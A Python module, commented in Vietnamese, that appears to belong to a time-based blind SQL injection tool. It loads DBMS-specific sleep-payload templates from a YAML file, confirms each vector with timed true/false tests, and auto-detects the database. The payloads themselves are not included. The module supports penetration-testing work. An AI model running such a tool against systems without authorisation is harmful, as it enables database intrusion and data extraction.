#!/usr/bin/env python3
"""
Quản lý kho vector time-based blind (data/vectors.yaml) + logic đo DBMS/vector.

Cấu trúc 2 tầng: mỗi DBMS có `dialect` (mạnh cú pháp để extract lắp ráp) và `vectors`
(danh sách template sleep). Xem data/vectors.yaml.

Cơ chế đo (theo DESIGN mục 7):
  - Với mỗi vector, XÁC NHẬN bằng test TRUE + FALSE:
        [INFERENCE]=1=1  -> PHẢI chậm (~sleeptime)
        [INFERENCE]=1=2  -> PHẢI nhanh
    Chỉ nhận vector khi cả hai đúng. Loại oracle giả (delay do lỗi cú pháp / lag).
  - Vector đầu tiên vượt qua -> chốt cho toàn bộ khai thác.
  - Tự dò DBMS (--dbms auto): thử vector của lần lượt từng DBMS tới khi có cái đạt.

Module KHÔNG tự gửi request. Nó nhận một callable `measure(payload) -> dt_giay` (do
transport/oracle cung cấp) nên test được bằng mock offline.
"""

from __future__ import annotations

import os
import random
import re
import string
from dataclasses import dataclass
from typing import Callable, Optional

import yaml

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_DEFAULT_VECTORS = os.path.join(_REPO_ROOT, "data", "vectors.yaml")

# điều kiện hằng số để xác nhận vector
COND_TRUE = "1=1"
COND_FALSE = "1=2"


class VectorError(Exception):
    pass


@dataclass
class Vector:
    """Một vector sleep đã gắn DBMS + dialect của nó."""
    dbms: str
    name: str
    template: str
    note: str
    dialect: dict

    def render(self, inference: str, sleeptime: float) -> str:
        """Dựng payload thực từ template: thay [INFERENCE], [SLEEPTIME], [RANDNUM], [RANDSTR].

        [RANDNUM]/[RANDSTR] sinh mỗi lần render (tránh cache, đặt alias duy nhất).
        """
        out = self.template
        out = out.replace("[INFERENCE]", inference)
        # sleeptime: bỏ .0 thừa cho số nguyên (sleep(3) đẹp hơn sleep(3.0))
        st = ("%g" % sleeptime)
        out = out.replace("[SLEEPTIME]", st)
        out = out.replace("[RANDNUM]", str(random.randint(1000, 9999)))
        out = out.replace("[RANDSTR]", _rand_str())
        return out


def _rand_str(n: int = 4) -> str:
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


class VectorStore:
    """Nạp và truy vấn kho vector từ YAML."""

    def __init__(self, data: dict):
        if not isinstance(data, dict) or not data:
            raise VectorError("vectors.yaml rỗng hoặc sai định dạng")
        self.data = data

    @classmethod
    def load(cls, path: Optional[str] = None) -> "VectorStore":
        path = path or _DEFAULT_VECTORS
        if not os.path.isfile(path):
            raise VectorError("không tìm thấy file vector: %s" % path)
        with open(path, "r", encoding="utf-8") as f:
            data = yaml.safe_load(f)
        return cls(data)

    def dbms_list(self) -> list[str]:
        return list(self.data.keys())

    def dialect(self, dbms: str) -> dict:
        if dbms not in self.data:
            raise VectorError("không có DBMS '%s' trong kho vector" % dbms)
        return self.data[dbms].get("dialect", {})

    def vectors_for(self, dbms: str) -> list[Vector]:
        if dbms not in self.data:
            raise VectorError("không có DBMS '%s' trong kho vector" % dbms)
        block = self.data[dbms]
        dialect = block.get("dialect", {})
        result = []
        for v in block.get("vectors", []):
            result.append(Vector(
                dbms=dbms,
                name=v["name"],
                template=v["template"],
                note=v.get("note", ""),
                dialect=dialect,
            ))
        return result

    def get_vector(self, name: str) -> Vector:
        """Tìm vector theo tên (cho cờ --vector). Duyệt mọi DBMS."""
        for dbms in self.dbms_list():
            for v in self.vectors_for(dbms):
                if v.name == name:
                    return v
        raise VectorError("không tìm thấy vector tên '%s'" % name)


# --------------------------------------------------------------------------- đo
@dataclass
class DetectResult:
    vector: Vector
    baseline: float          # độ trễ nền (điều kiện FALSE)
    slow: float              # độ trễ khi TRUE (có sleep)
    threshold: float         # ngưỡng phân biệt


def confirm_vector(vector: Vector,
                   measure: Callable[[str], float],
                   sleeptime: float,
                   margin: float = 0.5) -> Optional[DetectResult]:
    """Xác nhận một vector bằng test TRUE + FALSE.

    measure(payload) -> số giây phản hồi.
    Trả về DetectResult nếu vector hợp lệ (TRUE chậm & FALSE nhanh), None nếu không.

    Tiêu chí:
      - FALSE (1=2): dt_false  ~ baseline (không sleep)
      - TRUE  (1=1): dt_true  >= dt_false + sleeptime*margin  (có sleep)
    """
    # FALSE trước để lấy baseline
    dt_false = measure(vector.render(COND_FALSE, sleeptime))
    dt_true = measure(vector.render(COND_TRUE, sleeptime))

    # ngưỡng: giữa baseline và baseline+sleeptime
    threshold = dt_false + sleeptime * margin

    # TRUE phải vượt ngưỡng, FALSE phải dưới ngưỡng
    if dt_true >= threshold and dt_false < threshold:
        return DetectResult(
            vector=vector,
            baseline=dt_false,
            slow=dt_true,
            threshold=threshold,
        )
    return None


def detect_vector(store: VectorStore,
                  measure: Callable[[str], float],
                  sleeptime: float = 3.0,
                  dbms: str = "auto",
                  forced_vector: Optional[str] = None,
                  margin: float = 0.5,
                  log: Optional[Callable[[str], None]] = None) -> DetectResult:
    """Đo và chốt một vector.

    - forced_vector: nếu có, chỉ xác nhận đúng vector đó (cho --vector).
    - dbms='auto': thử lần lượt mọi DBMS. Ngược lại chỉ thử DBMS chỉ định.
    - Trả về DetectResult đã chốt. Raise VectorError nếu không vector nào đúng.
    """
    def _log(msg):
        if log:
            log(msg)

    # Chọn danh sách vector sẽ thử
    if forced_vector:
        candidates = [store.get_vector(forced_vector)]
        _log("[vector] ép dùng vector '%s'" % forced_vector)
    elif dbms == "auto":
        candidates = []
        for db in store.dbms_list():
            candidates.extend(store.vectors_for(db))
        _log("[vector] dò tự động trên %d DBMS (%d vector)"
             % (len(store.dbms_list()), len(candidates)))
    else:
        candidates = store.vectors_for(dbms)
        _log("[vector] dò %d vector của DBMS '%s'" % (len(candidates), dbms))

    for v in candidates:
        _log("[vector] thử %s/%s ..." % (v.dbms, v.name))
        res = confirm_vector(v, measure, sleeptime, margin)
        if res:
            _log("[vector] CHỐT %s/%s (baseline=%.2fs, slow=%.2fs, threshold=%.2fs)"
                 % (v.dbms, v.name, res.baseline, res.slow, res.threshold))
            _log("[vector] template: %s" % v.template)
            return res

    raise VectorError(
        "không vector nào vượt qua xác nhận TRUE/FALSE. "
        "Kiểm tra: marker đúng chỗ? payload có bị filter? sleep có hoạt động?"
    )
